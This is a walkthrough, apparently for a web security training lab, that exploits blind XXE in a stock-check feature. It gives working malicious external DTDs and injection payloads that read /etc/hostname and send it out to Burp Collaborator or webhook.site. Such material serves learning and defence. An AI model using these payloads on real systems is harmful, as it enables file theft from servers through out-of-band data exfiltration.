# Lab: Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD

## Description

This lab contains a "Check stock" feature that parses XML input but does not display the result. The objective is to exploit a Blind XXE vulnerability to exfiltrate the contents of the `/etc/hostname` file by leveraging a malicious external DTD and an out-of-band channel.

## Vulnerability Overview

Since the application does not return the results of XML parsing in its response, direct file disclosure is not possible. However, the XML parser processes external DTDs and parameter entities. By hosting a malicious DTD on an attacker-controlled server, it is possible to read local files and exfiltrate their contents to an external domain through an HTTP request.

---

## Method 1: Using Burp Collaborator (Official Solution)

### Step 1: Create the Malicious DTD

Create a DTD file containing:

```xml id="4vx5n9"
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

This DTD:

1. Reads the contents of `/etc/hostname`.
2. Dynamically creates a parameter entity named `exfil`.
3. Sends the file contents to the Burp Collaborator server through the query parameter `x`.

---

### Step 2: Host the DTD

Upload the malicious DTD to the exploit server and note its URL:

```text id="t5jzom"
https://exploit-server-id.exploit-server.net/exploit
```

---

### Step 3: Trigger the External DTD

Intercept the stock check request and insert:

```xml id="xiz7zr"
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
%xxe;
]>
```

Example:

```xml id="2g2wh3"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://exploit-server-id.exploit-server.net/exploit">
%xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

---

### Step 4: Observe the Interactions

Poll Burp Collaborator and inspect the HTTP interactions.

The request contains:

```text id="prr1go"
http://BURP-COLLABORATOR-SUBDOMAIN/?x=<contents of /etc/hostname>
```

The value of parameter `x` reveals the contents of the `/etc/hostname` file, solving the lab.

---

## Method 2: Using Webhook.site (Alternative)

### Step 1: Obtain a Webhook.site URL

Generate a unique endpoint:

```text id="n4uvhz"
https://webhook.site/YOUR-UNIQUE-ID
```

---

### Step 2: Create the Malicious DTD

```xml id="eb5jvl"
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/YOUR-UNIQUE-ID?x=%file;'>">
%eval;
%exfil;
```

---

### Step 3: Host the DTD

Upload the DTD to the exploit server.

---

### Step 4: Trigger the Payload

Send:

```xml id="5oyjlwm"
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
%xxe;
]>
```

---

### Step 5: Monitor Webhook.site

If the attack succeeds, an incoming HTTP request appears:

```text id="0w6jlwm"
GET /?x=<contents of /etc/hostname>
```

revealing the hostname value.

---

#d XXE vulnerability can be exploited using a malicious external DTD. By abusing parameter entities and out-of-band communication, an attacker can exfiltrate sensitive files even when the application does not display the results of XML parsing. The attack highlights the dangers of allowing external DTD processing and unrestricted outbound connections.
